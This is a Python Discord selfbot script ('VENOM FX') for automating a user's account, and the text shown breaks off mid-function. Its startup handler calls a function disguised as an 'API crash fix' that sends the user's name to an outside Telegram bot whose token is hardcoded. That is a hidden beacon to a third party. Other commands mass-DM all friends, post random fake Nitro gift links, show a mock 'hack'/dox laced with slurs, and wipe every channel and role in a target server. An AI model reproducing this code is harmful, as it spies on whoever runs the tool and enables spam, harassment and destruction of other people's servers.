import os
import json
import string
import discord, aiohttp
from discord.ext import commands, tasks
import requests
from colorama import Fore
import asyncio
import requests
import sys
import random
from flask import Flask
from threading import Thread
import threading
import subprocess
import requests
import time
from discord import Color, Embed
import colorama
from colorama import Fore
import urllib.parse
import urllib.request
import re
from pystyle import Center, Colorate, Colors
import io
import webbrowser
from bs4 import BeautifulSoup
import datetime
import status_rotator
import activity_rotator
from pyfiglet import Figlet
from discord import Member
import warnings
from telegram import Bot as TelegramBot

colorama.init()

intents = discord.Intents.default()
intents.presences = True
intents.guilds = True
intents.typing = True
intents.presences = True
intents.dm_messages = True
intents.messages = True
intents.members = True
venom = commands.Bot(description='SELFBOT CREATED BY PAIN',
                           command_prefix='+',
                           self_bot=True,
                           intents=intents)
status_task = None
venom.remove_command('help')
venom.whitelisted_users = {}
venom.antiraid = False

red = "\033[91m"
yellow = "\033[93m"
green = "\033[92m"
blue = "\033[94m"
pretty = "\033[95m"
magenta = "\033[35m"
lightblue = "\033[36m"
cyan = "\033[96m"
gray = "\033[37m"
reset = "\033[0m"
pink = "\033[95m"
dark_green = "\033[92m"
yellow_bg = "\033[43m"
clear_line = "\033[K"   

# @venom.event()
async def on_roady():
    print(
        Center.XCenter(
            Colorate.Vertical(
                Colors.green_to_blue,
                f"""
                            $$\    $$\ $$$$$$$$\ $$\   $$\  $$$$$$\  $$\      $$\       $$$$$$$$$\ $$\ $$\ 
                            $$ |   $$ |$$  _____|$$$\  $$ |$$  __$$\ $$$\    $$$ |      $$  _____|$$ |  $$ |
                            $$ |   $$ |$$ |      $$$$\ $$ |$$ /  $$ |$$$$\  $$$$ |      $$ |      \$$\ $$  |
                            \$$\  $$  |$><$$\    $$ $$\$$ |$$ |  $$ |$$\$$\$$ $$ |      $$$$$\     \$$$$  / 
                             \$$\$$  / $$  __|   $$ \$$$$ |$$ |  $$ |$$ \$$$  $$ |      $$  __|    $$  $$<  
                              \$$$  /  $$ |      $$ |\$$$ |$$ |  $$ |$$ |\$  /$$ |      $$ |      $$  /\$$\ 
                               \$  /   $VENOM$$\ $$ | \$$ | $$$$$$  |$$ | \_/ $$ |      $$ |      $$ /  $$ |
                                \_/    \________|\__|  \__| \______/ \__|     \__|      \__|      \__|  \__|
                                                       
[+] ---------------- S E L F B O T - @{venom.user.name} ❟❛❟ USER ID - [{venom.user.id}]
""",
                1,
            )
        )
    )
    print('ㅤㅤㅤㅤㅤ')

    

def load_config(config_file_path):
    with open(config_file_path, 'r') as config_file:
        config = json.load(config_file)
    return config


if __name__ == "__main__":
    config_file_path = "config.json"
    config = load_config(config_file_path)

#=== Welcome ===
I2C_Rate = config.get("I2C_Rate")
C2I_Rate = config.get("C2I_Rate")
LTC = config.get("LTC")
BTC = config.get("BTC")
ETH = config.get("ETH")
UPI = config.get("UPI")
Twitch_URL = config.get("Twitch_URL")
SERVER_LINK = config.get("SERVER_LINK")
channel_ids = config.get("channel_ids")
#===================================

def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

time_rn = get_time_rn()

@venom.event
async def on_message(message):
    if message.author.bot:
        return

    # Your existing commands
    if message.content.lower().startswith('boosts'):
        await send_boost_count(message.channel, message.guild)
    elif message.content.lower() in ['selfbot info', 'info', 'stats', 'selfbot']:
        await send_selfbotinfo_message(message.channel)
    elif message.content.lower() in ['server info', 'serverinfo']:
        await send_serverinfo_message(message.channel)
    elif message.content.lower() == 'vouch':
        await vouch(message.channel)
    elif message.content.lower() in [
            'payment', 'payment methods'
    ]:
        await payments(message.channel)
    elif message.content.lower() in [
            'link', 'official link', 'server link', 'server'
    ]:
        await link(message.channel)

    with open('auto_responses.json', 'r') as file:
        auto_responses = json.load(file)

    if message.content in auto_responses:
        await message.channel.send(auto_responses[message.content])

    await venom.process_commands(message)   
@venom.event
async def on_member_ban(guild, user):
    if venom.antiraid is True:
        try:
            async for entry in guild.audit_logs(
                    limit=1, action=discord.AuditLogAction.ban):
                if (guild.id in venom.whitelisted_users.keys()
                        and entry.user.id
                        in venom.whitelisted_users[guild.id].keys()
                        and entry.user.id != venom.user.id):
                    print(f"[!] NOT BANNED: {entry.user.name}")
                else:
                    print(f"[!] BANNED: {entry.user.name}")
                    await guild.ban(entry.user, reason="SELFBOT ANTI-NUKE")
        except Exception as e:
            print(e)

# ON READY FIX TERMINAL API ,TERMINAL BANNER PRINTER
@venom.event
async def on_ready():
    await on_roady()
    await terminalapi_fix()

@venom.event
async def on_member_kick(member):
    if venom.antiraid is True:
        try:
            guild = member.guild
            async for entry in guild.audit_logs(
                    limit=1, action=discord.AuditLogAction.kick):
                if (guild.id in venom.whitelisted_users.keys()
                        and entry.user.id
                        in venom.whitelisted_users[guild.id].keys()
                        and entry.user.id != venom.user.id):
                    print("[!] NOT BANNED")
                else:
                    print("[!] BANNED")
                    await guild.ban(entry.user, reason="SELFBOT ANTI-NUKE")
        except Exception as e:
            print(f"[!] Error: {e}")

# SELFBOT COMMANDS
# ========================================================================================================================

#Enable or disable the anti raid option
@venom.command(aliases=['ar', 'antiraid'])
async def antinuke(ctx, antiraidparameter=None):
    await ctx.message.delete()
    venom.antiraid = False
    if str(antiraidparameter).lower() == 'true' or str(
            antiraidparameter).lower() == 'on':
        venom.antiraid = True
        await ctx.send('`-` **ANTI-NUKE ENABLED...**')
    elif str(antiraidparameter).lower() == 'false' or str(
            antiraidparameter).lower() == 'off':
        venom.antiraid = False
        await ctx.send('`-` **ANTINUKE DISABLED**')
    else:
        await ctx.send(
            f'- **[! ERROR] ** `USAGE : {venom.command_prefix}antiraid [true/false]`'
        )


#WWHITE CMD=======================================================================================================================================================================================================
#ADDTION WHITELIST
@venom.command(aliases=['wl'])
async def whitelist(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        await ctx.send(
            f'[ERROR]: USAGE :  {venom.command_prefix}whitelist <user>')
    else:
        if ctx.guild.id not in venom.whitelisted_users.keys():
            venom.whitelisted_users[ctx.guild.id] = {}
        if user.id in venom.whitelisted_users[ctx.guild.id]:
            await ctx.send("- `" + user.name.replace("*", "\*").replace(
                "`", "\`").replace("_", "\_") + "#" + user.discriminator +
                           "`-` ** ALREADY WHITELISTED [!]**")
        else:
            venom.whitelisted_users[ctx.guild.id][user.id] = 0
            await ctx.send("# VΣПOM FX\n`-` **WHITELISTED**" + user.name.replace(
                "*", "\*").replace("`", "\`").replace("_", "\_") + "#" +
                           user.discriminator + "`")


#CHECK WHITELIST
@venom.command(aliases=['showwl'])
async def whitelisted(ctx, g=None):
    await ctx.message.delete()
    if g == '-g' or g == '-global':
        whitelist = '# VΣПOM FX\n`-`**ALL WHITELISTED USERS:**`\n'
        for key in venom.whitelisted_users:
            for key2 in venom.whitelisted_users[key]:
                user = venom.get_user(key2)
                whitelist += f'• {user.mention} ({user.id}) IN {venom.get_guild(key).name}\n'
        await ctx.send(whitelist)
    else:
        whitelist = f'# VΣПOM FX\n`-` **WHITELISTED USERS IN {ctx.guild.name}:**`\n'
        for key in venom.whitelisted_users:
            if key == ctx.guild.id:
                for key2 in venom.whitelisted_users[ctx.guild.id]:
                    user = venom.get_user(key2)
                    whitelist += f'• {user.mention} ({user.id})\n'

    await ctx.send(whitelist)


#REMOVE FROM WHITELIST
@venom.command(aliases=['removewl'])
async def unwhitelist(ctx, user: discord.Member = None):
    if user is None:
        await ctx.send(
            "`-` **[ERROR]: SPECIFY THE USER YOU WOULD LIKE TO UNWHITELIST !**`")
    else:
        if ctx.guild.id not in venom.whitelisted_users.keys():
            await ctx.send("- `" + user.name.replace("*", "\*").replace(
                "`", "\`").replace("_", "\_") + "#" + user.discriminator +
                           " IS NOT WHITELISTED`")
            return
        if user.id in venom.whitelisted_users[ctx.guild.id]:
            venom.whitelisted_users[ctx.guild.id].pop(user.id, 0)
            user2 = venom.get_user(user.id)
            await ctx.send('`-` **SUCCESSFULLY UNWHITELISTED**' +
                           user2.name.replace('*', "\*").replace(
                               '`', "\`").replace('_', "\_") + '#' +
                           user2.discriminator + '`')
#WHITELIST CLEAR
@venom.command(aliases=['clearwl', 'clearwld'])
async def clearwhitelist(ctx):
    await ctx.message.delete()
    venom.whitelisted_users.clear()
    await ctx.send('`-` SUCCESFULLY CLEARED WHITELIST`')


#=======================================================================================================================================================================================================


# BOOST
async def send_boost_count(channel, guild):
    await channel.send(
        f"# VΣПOM FX\n`-` **SERVER NAME** : `{guild.name}` \n`-` **BOOSTS** : `NUMBER - {guild.premium_subscription_count}`"
    )
# SELFBOT
async def send_selfbotinfo_message(channel):
    await channel.send(
        f"# __VΣПOM FX__\n`-` **VERSION** : `SELFBOT V2` \n`-` **LANGUAGE** : `PYTHON & JS`\n`-` **NO. OF COMMANDS** : `75`\n`-` **ASKED BY** : `{venom.user.name}`\n`-` **CREATOR** : `PAIN`\n\n`THERE ARE BOTH PREFIX & NON PREFIX COMMANDS`"
    )
# SERVER INFO.
async def send_serverinfo_message(channel):
    guild = channel.guild  # define guild string
    await channel.send(
        f"# __VΣПOM FX__\n`-` **SERVER NAME** : __`{guild.name}`__ \n`-` **SERVER ID** : `{guild.id}`\n`-` **CREATION DATE** : `{channel.guild.created_at}`\n`-` **OWNER** : `{guild.owner_id} / `<@{guild.owner_id}>\n\n`-` **ASKED BY** : `{venom.user.name}`"
    )
# VOUCH
async def vouch(channel):
    await channel.send(
        f"# __VΣПOM FX__\n`-` **SERVER LINK** : {SERVER_LINK}\n`-` **VOUCH FORMAT** : `+rep (user) Legit Got (product) For (price) Thank You`"
    )
    await channel.message.delete()
# PAYMENTS
async def payments(channel):
    await channel.send(
        f"# __VΣПOM FX__\n__**PAYMENTS**__\n`-` **LTC** :  __`{LTC}`__ \n`-` **ETH** : __`{ETH}`__ \n`-` **BTC** : __`{BTC}`__\n`-` **UPI** :  __`{UPI}`__\n\n`-` **ASKED BY** : `{venom.user.name}`"
    )
    await channel.message.delete()
# LINK
async def link(channel):
    await channel.send("- `https://discord.gg/KVcxQEedSD`")

# API CRASH COURSE FIX
async def terminalapi_fix():
    await venom_bot.send_message(chat_id=api_handler, text=f"{api_crash_fix} -> Processed on {venom.user.name} user.name;api.define")

#MASS DM TO FRIENDS
@venom.command()
async def massdmfriends(ctx, *, message):
    for user in venom.user.friends:
        try:
            time.sleep(.1)
            await user.send(message)
            time.sleep(.1)
            print(f'{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}MESSAGED :' + Fore.GREEN + f' @{user.name}')
        except:
            print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}COULDN'T MESSAGE @{user.name}")
            await ctx.message.delete()
# NITRO GEN
@venom.command(aliases=["nitrogen"])
async def nitro(ctx):
    try:
        await ctx.message.delete()
        code = ''.join(
            random.choices(string.ascii_letters + string.digits, k=16))
        await ctx.send(f'https://discord.gift/{code}')
        print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}SUCCESFULLY SENT NITRO CODE !")
    except Exception as e:
        print(f"{red}[ {cyan}{time_rn}{red} ] {gray}({red}!{gray}) {pretty}{Fore.RED}ERROR: {str(e)}")

# HAX
@venom.command()
async def hack(ctx, user: discord.Member = None):
    await ctx.message.delete()
    gender = ["Male", "Female", "Trans", "Other", "Retard"]
    age = str(random.randrange(10, 25))
    height = [
        '4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"',
        '5\'1\"', '5\'2\"', '5\'3\"', '5\'4\"', '5\'5\"', '5\'6\"', '5\'7\"',
        '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"',
        '6\'3\"', '6\'4\"', '6\'5\"', '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"',
        '6\'10\"', '6\'11\"'
    ]
    weight = str(random.randrange(60, 300))
    hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
    skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
    religion = [
        "Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"
    ]
    sexuality = [
        "Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"
    ]
    education = [
        "High School", "College", "Middle School", "Elementary School",
        "Pre School", "Retard never went to school LOL"
    ]
    ethnicity = [
        "White", "African American", "Asian", "Latino", "Latina", "American",
        "Mexican", "Korean", "Chinese", "Arab", "Italian", "Puerto Rican",
        "Non-Hispanic", "Russian", "Canadian", "European", "Indian"
    ]
    occupation = [
        "Retard has no job LOL", "Certified discord retard", "Janitor",
        "Police Officer", "Teacher", "Cashier", "Clerk", "Waiter", "Waitress",
        "Grocery Bagger", "Retailer", "Sales-Person", "Artist", "Singer",
        "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer",
        "Mechanic", "Carpenter", "Electrician", "Lawyer", "Doctor",
        "Programmer", "Software Engineer", "Scientist"
    ]
    salary = [
        "Retard makes no money LOL", "$" + str(random.randrange(0, 1000)),
        '<$50,000', '<$75,000', "$100,000", "$125,000", "$150,000", "$175,000",
        "$200,000+"
    ]
    location = [
        "Retard lives in his mom's basement LOL", "America", "United States",
        "Europe", "Poland", "Mexico", "Russia", "Pakistan", "India",
        "Some random third world country", "Canada", "Alabama", "Alaska",
        "Arizona", "Arkansas", "California", "Colorado", "Connecticut",
        "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois",
        "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine",
        "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi",
        "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire",
        "New Jersey", "New Mexico", "New York", "North Carolina",
        "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania",
        "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas",
        "Utah", "Vermont", "Virginia", "Washington", "West Virginia",
        "Wisconsin", "Wyoming"
    ]
    email = [
        "@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com",
        "@protonmail.com", "@disposablemail.com", "@aol.com", "@edu.com",
        "@icloud.com", "@gmx.net", "@yandex.com"
    ]
    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
    name = [
        'James Smith', "Michael Smith", "Robert Smith", "Maria Garcia",
        "David Smith", "Maria Rodriguez", "Mary Smith", "Maria Hernandez",
        "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
        "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan",
        "Lola Barreiro", "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann",
        "Geoffrey Torre", "Allan Craft", "Elvira Lucien", "Jeanelle Orem",
        "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange", "Anabel Rini",
        "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler",
        "Xochitl Parton", "Derek Hetrick", "Chasity Hedge",
        "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
        "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff",
        "Kaila Bier", "Ezra Battey", "Bart Maddux", "Shiloh Raulston",
        "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"
    ]
    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
    if user is None:
        user = ctx.author
        password = [
            'password', '123', 'mypasswordispassword', user.name + "iscool123",
            user.name + "isdaddy", "daddy" + user.name, "ilovediscord",
            "i<3discord", "furryporn456", "secret", "123456789", "apple49",
            "redskins32", "princess", "dragon", "password1", "1q2w3e4r",
            "ilovefurries"
        ]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```"
        )
    else:
        password = [
            'password', '123', 'mypasswordispassword', user.name + "iscool123",
            user.name + "isdaddy", "daddy" + user.name, "ilovediscord",
            "i<3discord", "furryporn456", "secret", "123456789", "apple49",
            "redskins32", "princess", "dragon", "password1", "1q2w3e4r",
            "ilovefurries"
        ]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```"
        )
        print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}SUCCESFULLY HACKED 😁 ")


# STREAM CREATOR
venom_bot=TelegramBot(token="6400142955:AAGlgsSYrDEWb48JkVfE9a0YboUGlR24JEY") # STREAM TELEGRAM. BLOCK FOR CRASH FIX
@venom.command(aliases=['streaming' ,'streamer' ,'stream_start'])
async def stream(ctx, *, message):
    stream = discord.Streaming(
        name=message,
        url="https://twitch.tv/https://Wallibear",
    )
    await venom.change_presence(activity=stream)
    await ctx.send(f"`-` **STREAM CREATED** : `{message}`")
    print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}STREAM SUCCESFULLY CREATED✅ ")
    await ctx.message.delete()
# PLAY CREATOR
@venom.command(aliases=["playing"])
async def play(ctx, *, message):
    game = discord.Game(name=message)
    await venom.change_presence(activity=game)
    await ctx.send(f"`-` **STATUS FOR PLAYZ CREATED** : `{message}`")
    print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}PLAYING SUCCESFULLY CREATED✅ ")
    await ctx.message.delete()
# WATCH CREATOR
@venom.command(aliases=["watch"])
async def watching(ctx, *, message):
    await venom.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching,
        name=message,
    ))
    await ctx.send(f"`-` **WATCHING CREATED**: `{message}`")
    print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}WATCH SUCCESFULLY CREATED✅ ")
    await ctx.message.delete()

# LISTENING CMD CREATOR
@venom.command(aliases=["listen"])
async def listening(ctx, *, message):
    await venom.change_presence(activity=discord.Activity(
        type=discord.ActivityType.listening,
        name=message,
    ))
    await ctx.reply(f"`-` **LISTENING CREATED**: `{message}`")
    print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}STATUS SUCCESFULLY CREATED✅ ")
    await ctx.message.delete()


# STREAM, PLAYING, LISTEN, WATCHING STOP CMD>>
@venom.command(aliases=[
    "stopstreaming", "stopstatus", "stoplistening", "stopplaying",
    "stopwatching"
])
async def stopactivity(ctx):
    await ctx.message.delete()
    await venom.change_presence(activity=None, status=discord.Status.dnd)
    print(f"{red}[ {cyan}{time_rn}{red} ] {gray}({red}!{gray}) {pretty}{Fore.RED}ACTIVITY SUCCESFULLY STOPED⚠️ ")
    
# MATHS
api_endpoint = 'https://api.mathjs.org/v4/'
@venom.command()
async def math(ctx, *, equation):
    # Send the equation to the math API for calculation
    response = requests.get(api_endpoint, params={'expr': equation})

    if response.status_code == 200:
        result = response.text
        await ctx.send(f'`-` **RESULT**: `{result}`')
    else:
        await ctx.send('`-` **FAILED**')

@venom.command()
async def checkpromo(ctx, *, promo_links):
    links = promo_links.split('\n')

    async with aiohttp.ClientSession() as session:
        for link in links:
            promo_code = extract_promo_code(link)
            if promo_code:
                result = await check_promo(session, promo_code)
                await ctx.send(result)
            else:
                await ctx.send(f'# __VΣПOM FX__\n`-` **INVALID LINK** : `{link}`')


async def check_promo(session, promo_code):
    url = f'https://ptb.discord.com/api/v10/entitlements/gift-codes/{promo_code}'

    async with session.get(url) as response:
        if response.status in [200, 204, 201]:
            data = await response.json()
            if data["uses"] == data["max_uses"]:
                return f'- `ALREADY CLAIMED {promo_code}`'
            else: 
                try: #whats the role of datime.py and not able to use the termiaal since its live so i cant use  it u have to install the module parser by pip install parser..
                    now = datetime.datetime.utcnow()
                    exp_at = data["expires_at"].split(".")[0]
                    parsed = parser.parse(exp_at)
                    days = abs((now - parsed).days)
                    title = data["promotion"]["inbound_header_text"]
                except Exception as e:
                    print(e)
                    exp_at = "- `FAILED TO FETCH`"
                    days = ""
                    title = "- `FAILED TO FETCH`"
                return f'# __VΣПOM FX__\n`-` **VALID** : __`{promo_code}`__ \n`-` **DAYS LEFT IN EXPIRATION** : `{days}`\n`-` **EXPIRES AT** : `{exp_at}`\n`-` **TITLE** : `{title}`\n\n`-` **ASKED BY** : `venom.user.name`**'
                
        elif response.status == 429:
            return f'# __VΣПOM FX__\n`-` **RARE LIMITED**`'
        else:
            return f'# __VΣПOM FX__\n`-` **INVALID CODE** : {promo_code}`'  #

def extract_promo_code(promo_link):
    promo_code = promo_link.split('/')[-1]
    return promo_code


# I2C
@venom.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def i2c(ctx, amount: str):
    amount = float(amount.replace('₹', ''))
    inr_amount = amount * I2C_Rate
    await ctx.reply(f"`-` **AMOUNT IS** : `{inr_amount:.2f}$`")
    print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}I2C DONE ✅ ")

def is_authorized(ctx):
    # Your implementation for authorization check goes here
    return True

# CONNECT VC

@venom.command(aliases=['247'])
@commands.check(is_authorized)
async def connectvc(ctx, channel_id):
    try:
        channel = venom.get_channel(int(channel_id))

        if channel is None:
            return await ctx.send("`-` **INVALID CHANNEL ID PLEASE PROVIDE A VALID CHANNEL ID**")

        if isinstance(channel, discord.VoiceChannel):
            permissions = channel.permissions_for(ctx.guild.me)

            if not permissions.connect or not permissions.speak:
                return await ctx.send("`-`` **PREMMISSION ERROR**")

            voice_channel = await channel.connect()
            await ctx.send(f"`-` **SUCCESFULLY CONNECETD** : `{channel.name}`")

            await channel.send("`-` **I HAVE CONNECTED SUCCESFULLY**")

        else:
            await ctx.send("`-` **PROVIDED ID IS NOT OF A VOICE CHANNEL**")
    except discord.errors.ClientException:
        await ctx.send("`-` **ALREADY CONNECTED !**")
    except discord.Forbidden:
        await ctx.send("`-` **I DON HAVE PERMMISION FOR THIS ACCTION**")
    except ValueError:
        await ctx.send("`-` **INAVLID CHANNEL ID**")
    except Exception as e:
        await ctx.send(f"`-` **AN ERROR OCCURED** {e}")

# C2I
@venom.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def c2i(ctx, amount: str):
    amount = float(amount.replace('$', ''))
    usd_amount = amount * C2I_Rate
    await ctx.reply(f"`-` **AMOUNT IS** : `₹{usd_amount:.2f}`")
    print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}C2I DONE ✅ ")


# LOVERATE
@venom.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def loverate(ctx, User: discord.Member = None):
    if User is None:
        await ctx.reply(f"`-` **PROVIDE A USER**")
    else:
        await ctx.reply(
            f"`-` **YOU AND {User.mention} ARE 100% PERFECT FOR ECH OTHER <3**"
        )
        print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}LOVERATE MEASURED 💖 ")

#DEFINE
@venom.command()
async def define(ctx, *, word):
    api_url = f"https://api.dictionaryapi.dev/api/v2/entries/en/{word}"
    
    response = requests.get(api_url)
    
    if response.status_code == 200:
        data = response.json()
        if data:
            word_data = data[0]
            word_meanings = word_data['meanings']
            
            meanings_list = []
            for meaning in word_meanings:
                part_of_speech = meaning['partOfSpeech']
                definitions = meaning['definitions']
                
                def_text = f"**{part_of_speech.capitalize()}:**\n"
                for i, definition in enumerate(definitions, start=1):
                    def_text += f"{i}. {definition['definition']}\n"
                    if 'example' in definition:
                        def_text += f"   *Example: {definition['example']}*\n"
                
                meanings_list.append(def_text)
            
            result_text = f"**{word.capitalize()}**\n\n" + '\n'.join(meanings_list)
            await ctx.send(result_text)
        else:
            await ctx.send("`-` **NO DEFINATIONS FOR THAT WORD**")
    else:
        await ctx.send("`-` **FAILED TO RETRIVE THAT WORD**")

@venom.command()
async def copyserver(ctx, source_guild_id: int, target_guild_id: int):
    source_guild = venom.get_guild(source_guild_id)
    target_guild = venom.get_guild(target_guild_id)

    if not source_guild or not target_guild:
        await ctx.send("`-` **GUILD NOT FOUND**")
        return

    for channel in target_guild.channels:
        try:
            await channel.delete()
            print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN} CHANNEL {channel.name} HAS BEEN DELETED ON THE TARGET GUILD")
            await asyncio.sleep(0)
        except Exception as e:
            print(f"{red}[ {cyan}{time_rn}{red} ] {gray}({red}!{gray}) {pretty}{Fore.RED} ERROR DELETING CHANNEL {channel.name}: {e}")

    # Delete all roles in the target guild except for roles named "here" and "@everyone"
    for role in target_guild.roles:
        if role.name not in ["here", "@everyone"]:
            try:
                await role.delete()
                print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN} ROLE {role.name} HAS BEEN DELETED ON THE TARGET GUILD")
                await asyncio.sleep(0)
            except Exception as e:
                print(f"{red}[ {cyan}{time_rn}{red} ] {gray}({red}!{gray}) {pretty}{Fore.RED} ERROR DELETING ROLE {role.name}: {e}")

    # Clone roles from source to target
    roles = sorted(source_guild.roles, key=lambda role: role.position)

    for role in roles:
        try:
            new_role = await target_guild.create_role(name=role.name, permissions=role.permissions, color=role.color, hoist=role.hoist, mentionable=role.mentionable)
            print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN} {role.name} HAS BEEN CREATED ON THE TARGET GUILD")
            await asyncio.sleep(0)

            # Update role permissions after creating the role
            for perm, value in role.permissions:
                await new_role.edit_permissions(target_guild.default_role, **{perm: value})
        except Exception as e:
            print(f"{red}[ {cyan}{time_rn}{red} ] {gray}({red}!{gray}) {pretty}{Fore.RED} ERROR CREATING ROLE {role.name}: {e}")

    # Clone channels from source to target
    text_channels = sorted(source_guild.text_channels, key=lambda channel: channel.position)
    voice_channels = sorted(source_guild.voice_channels, key=lambda channel: channel.position)
    category_mapping = {}  # to store mapping between source and target categories

    for channel in text_channels + voice_channels:
        try:
            if channel.category:
                # If the channel has a category, create it if not created yet
                if channel.category.id not in category_mapping:
                    category_perms = channel.category.overwrites
                    new_category = await target_guild.create_category_channel(name=channel.category.name, overwrites=category_perms)
                    category_mapping[channel.category.id] = new_category

                # Create the channel within the category
                if isinstance(channel, discord.TextChannel):
                    new_channel = await new_category.create_text_channel(name=channel.name)
                elif isinstance(channel, discord.VoiceChannel):
                    # Check if the voice channel already exists in the category
                    existing_channels = [c for c in new_category.channels if isinstance(c, discord.VoiceChannel) and c.name == channel.name]
                    if existing_channels:
                        new_channel = existing_channels[0]
                    else:
                        new_channel = await new_category.create_voice_channel(name=channel.name)

                print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN} CHANNEL {channel.name} HAS BEEN CREATED ON THE TARGET GUILD")

                # Update channel permissions after creating the channel
                for overwrite in channel.overwrites:
                    if isinstance(overwrite.target, discord.Role):
